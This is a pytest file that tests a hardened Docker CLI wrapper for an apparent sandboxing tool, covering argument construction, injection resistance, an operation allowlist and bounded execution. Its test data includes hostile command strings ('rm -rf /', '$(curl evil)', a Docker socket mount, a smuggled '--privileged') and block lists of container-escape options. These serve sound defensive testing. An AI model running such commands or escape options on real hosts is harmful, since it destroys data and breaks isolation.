"""PP-003: typed Docker CLI construction, injection resistance, and bounded execution.

The bounded-execution tests start a local Python interpreter (this repository's own
harmless code), never Docker. A monkeypatched Popen proves the plan path never spawns.
"""

from __future__ import annotations

import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

import pytest
from _fakes import IMAGE, OWNERSHIP

from patchproof.runner import docker_cli as dc
from patchproof.runner.policy import ContainerId, PolicyViolation, Role, build_spec

ROOT = Path(__file__).resolve().parents[2]
NONCE = "c" * 32
CID = ContainerId("a" * 64)


def target_spec(script: str = "print('probe')"):  # type: ignore[no-untyped-def]
    return build_spec(ownership=OWNERSHIP, role=Role.TARGET, image=IMAGE, script=script, args=("target", NONCE))


def test_create_argv_golden() -> None:
    s = target_spec()
    labels = []
    for k, v in s.labels:
        labels += ["--label", f"{k}={v}"]
    assert dc.create_argv_tail(s) == [
        "container", "create", "--name", s.name, *labels,
        "--platform", "linux/amd64", "--pull=never", "--user", "10001:10001", "--entrypoint", "/usr/local/bin/python3", "--read-only",
        "--cap-drop", "ALL", "--security-opt", "no-new-privileges=true", "--network", "none", "--ipc", "private", "--shm-size", "16777216",
        "--cgroupns", "private", "--restart", "no", "--cpus", "1", "--memory", "1073741824",
        "--memory-swap", "1073741824", "--pids-limit", "128",
        "--tmpfs", "/scratch:rw,noexec,nosuid,nodev,size=268435456,mode=1777",
        "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,size=67108864,mode=1777",
        "--workdir", "/scratch", "--log-driver", "local", "--log-opt", "max-size=5m", "--log-opt", "max-file=2",
        "--log-opt", "compress=false", "--stop-timeout", "5",
        IMAGE.value, "-I", "-S", "-B", "-c", "print('probe')", "target", NONCE,
    ]


@pytest.mark.parametrize("role", [r for r in Role if r is not Role.VERIFIER])
def test_no_forbidden_option_in_any_role(role: Role) -> None:
    s = build_spec(ownership=OWNERSHIP, role=role, image=IMAGE, script="x=1",
                   args=("sleeper" if role.is_decoy else role.value, NONCE))
    options = dc.docker_options_of(dc.create_argv_tail(s))
    assert not set(options) & dc.FORBIDDEN_TOKENS
    for forbidden_prefix in ("--privileged", "--cap-add", "--volume", "--mount", "--publish", "--device",
                             "--pid", "--userns", "--uts", "--env", "--add-host", "--sysctl"):
        assert not any(o == forbidden_prefix or o.startswith(forbidden_prefix + "=") for o in options)
    assert "unconfined" not in " ".join(options)


@pytest.mark.parametrize("hostile", [
    "import os; os.system('rm -rf /')", "$(curl evil)", "`id`", "a\nb --privileged", "x' ; docker run -v /:/h",
    "--privileged", "-v /var/run/docker.sock:/s",
])
def test_script_content_cannot_become_docker_options(hostile: str) -> None:
    s = target_spec(script=hostile)
    argv = dc.create_argv_tail(s)
    baseline = dc.create_argv_tail(target_spec())
    assert len(argv) == len(baseline)

    def without_digest(options: list[str]) -> list[str]:
        return [o for o in options if not o.startswith("io.patchproof.script-sha256=")]

    assert without_digest(dc.docker_options_of(argv)) == without_digest(dc.docker_options_of(baseline))
    i = argv.index("-c")
    assert argv[i + 1] == hostile and argv[i - 3:i] == ["-I", "-S", "-B"]
    assert argv.index(IMAGE.value) < i


def test_container_refs() -> None:
    dc.ContainerRef("a" * 64)
    dc.ContainerRef("pp-probe-000000000000-target")
    for bad in ("--all", "-f", "unrelated_db", "a" * 12, "pp-probe-0-target", ""):
        with pytest.raises(PolicyViolation):
            dc.ContainerRef(bad)


def test_positional_operations_end_options_before_the_id() -> None:
    for op in (dc.Inspect(dc.ContainerRef(CID.value)), dc.Start(CID), dc.Wait(CID, 5), dc.Logs(CID),
               dc.Stop(CID), dc.Remove(CID)):
        tail = op.argv_tail()
        assert tail[-2:] == ["--", CID.value], op.op_name


def test_remove_is_exact_id_without_force_or_volumes() -> None:
    tail = dc.Remove(CID).argv_tail()
    assert tail == ["container", "rm", "--", CID.value]


def test_force_remove_has_one_fixed_shape() -> None:
    op = dc.ForceRemove(CID)
    assert op.argv_tail() == ["container", "rm", "--force", "--", CID.value]
    dc.assert_no_forbidden_tokens(op)
    with pytest.raises(PolicyViolation):
        dc.ForceRemove(ContainerId("short"))  # type: ignore[arg-type]

    @dataclass(frozen=True)
    class BulkForce(dc.ForceRemove):
        def argv_tail(self) -> list[str]:
            return ["container", "rm", "--force", "--volumes", "--", self.container.value]

    with pytest.raises(PolicyViolation, match="fixed shape"):
        dc.assert_no_forbidden_tokens(BulkForce(CID))


def test_force_is_forbidden_on_every_other_operation() -> None:
    for op in (dc.Remove(CID), dc.Stop(CID), dc.Inspect(dc.ContainerRef(CID.value))):
        assert "--force" not in op.argv_tail()


@pytest.mark.parametrize("role", [r for r in Role if r is not Role.VERIFIER])
def test_every_create_pins_platform_and_never_pulls(role: Role) -> None:
    s = build_spec(ownership=OWNERSHIP, role=role, image=IMAGE, script="x=1",
                   args=("sleeper" if role.is_decoy else role.value, NONCE))
    options = dc.docker_options_of(dc.create_argv_tail(s))
    i = options.index("--platform")
    assert options[i + 1] == "linux/amd64" and options.count("--platform") == 1
    assert options.count("--pull=never") == 1 and "--pull" not in options
    assert dc.create_argv_tail(s)[len(options)] == IMAGE.value


def test_snapshot_listings_are_read_only_and_fixed() -> None:
    for kind in dc.SNAPSHOT_KINDS:
        tail = dc.SnapshotList(kind).argv_tail()
        assert tail[1] in ("ls", "df") and "prune" not in tail and "rm" not in tail
        assert not dc.SnapshotList(kind).mutates
    with pytest.raises(PolicyViolation):
        dc.SnapshotList("system-prune")


def test_allowlist_contains_no_bulk_or_exec_operation() -> None:
    names = {t.__name__ for t in dc.ALLOWED_OP_TYPES}
    # PP-008 gate C (owner-approved 2026-10-13) adds exactly RunCreate and StartAttached.
    assert names == {"ContextInspect", "Version", "ImageInspect", "Create", "Inspect", "Start", "Wait", "Logs",
                     "Stop", "Remove", "ForceRemove", "SnapshotList", "RunCreate", "StartAttached"}
    assert not [n for n in dir(dc) if n.lower() in ("prune", "pull", "exec", "build", "kill", "run_raw")]


@dataclass(frozen=True)
class RogueOp:
    op_name: str = "prune"
    timeout_seconds: float = 1.0
    stdout_cap: int = 10
    mutates: bool = True
    tail: list[str] = field(default_factory=lambda: ["system", "prune", "-af"])

    def argv_tail(self) -> list[str]:
        return self.tail


def test_cli_refuses_non_allowlisted_operation(monkeypatch: pytest.MonkeyPatch) -> None:
    def no_spawn(*a: object, **k: object) -> None:
        raise AssertionError("must not spawn")

    monkeypatch.setattr(subprocess, "Popen", no_spawn)
    cli = dc.DockerCli("/usr/local/bin/docker", "/Users/synthetic")
    with pytest.raises(PolicyViolation, match="not allowlisted"):
        cli.run(RogueOp())  # type: ignore[arg-type]


def test_forbidden_token_check_catches_tampering() -> None:
    @dataclass(frozen=True)
    class TamperedRemove(dc.Remove):
        def argv_tail(self) -> list[str]:
            return ["container", "rm", "--force", "--volumes", "--", self.container.value]

    with pytest.raises(PolicyViolation, match="forbidden"):
        dc.assert_no_forbidden_tokens(TamperedRemove(CID))


def test_sanitized_env_drops_docker_and_proxy_variables(monkeypatch: pytest.MonkeyPatch) -> None:
    for key in ("DOCKER_HOST", "DOCKER_CONTEXT", "HTTPS_PROXY", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK"):
        monkeypatch.setenv(key, "x")
    env = dc.sanitized_env("/Users/synthetic")
    assert set(env) == {"HOME", "PATH", "LC_ALL", "LANG"}


def test_docker_binary_must_resolve_inside_allowlist(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    rogue = tmp_path / "docker"
    rogue.write_text("#!/bin/sh\n")
    monkeypatch.setattr(dc.shutil, "which", lambda *a, **k: str(rogue))
    with pytest.raises(PolicyViolation, match="outside the allowlist"):
        dc.resolve_docker_binary()
    monkeypatch.setattr(dc.shutil, "which", lambda *a, **k: None)
    with pytest.raises(PolicyViolation, match="not found"):
        dc.resolve_docker_binary()


# ------------------------------------------------------------------- bounded execution (local python only)

PY = [sys.executable, "-I", "-S", "-c"]


def test_run_bounded_caps_stdout_and_reports_truncation() -> None:
    res = dc.run_bounded([*PY, "import sys; sys.stdout.write('x' * 5_000_000)"], env={}, timeout_seconds=20,
                         stdout_cap=100_000)
    assert len(res.stdout) == 100_000 and res.stdout_truncated


def test_run_bounded_enforces_deadline() -> None:
    res = dc.run_bounded([*PY, "import time; time.sleep(30)"], env={}, timeout_seconds=1, stdout_cap=1000)
    assert res.timed_out and res.returncode is None and not res.ok
    assert res.duration_seconds < 10


def test_run_bounded_gives_eof_on_stdin_and_only_the_given_env() -> None:
    code = "import os, sys; print(repr(sys.stdin.read())); print(sorted(os.environ))"
    res = dc.run_bounded([*PY, code], env={"ONLY": "1"}, timeout_seconds=20, stdout_cap=10_000)
    lines = res.stdout.decode().splitlines()
    assert lines[0] == "''"
    assert "ONLY" in lines[1] and "HOME" not in lines[1]


def test_run_bounded_refuses_string_commands() -> None:
    with pytest.raises(PolicyViolation):
        dc.run_bounded("docker ps", env={}, timeout_seconds=1, stdout_cap=10)  # type: ignore[arg-type]
    with pytest.raises(PolicyViolation):
        dc.run_bounded([], env={}, timeout_seconds=1, stdout_cap=10)


def test_no_shell_true_and_single_subprocess_module() -> None:
    import ast

    sources = list((ROOT / "src").rglob("*.py")) + list((ROOT / "containers").rglob("*.py"))
    for path in sources:
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                for kw in node.keywords:
                    assert not (kw.arg == "shell" and not (isinstance(kw.value, ast.Constant)
                                                           and kw.value.value is False)), f"{path}:{node.lineno}"
                func = ast.unparse(node.func)
                assert func not in ("os.system", "os.popen", "os.execv", "os.execvp", "os.spawnv"), path
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                names = [a.name for a in node.names] + [getattr(node, "module", None) or ""]
                if "subprocess" in names:
                    # PP-005 adds exactly one reviewed wrapper: the allowlisted Git command module.
                    assert (path.name in ("docker_cli.py", "isolation_probe.py")
                            or path.relative_to(ROOT).as_posix() == "src/patchproof/git/command.py"), path
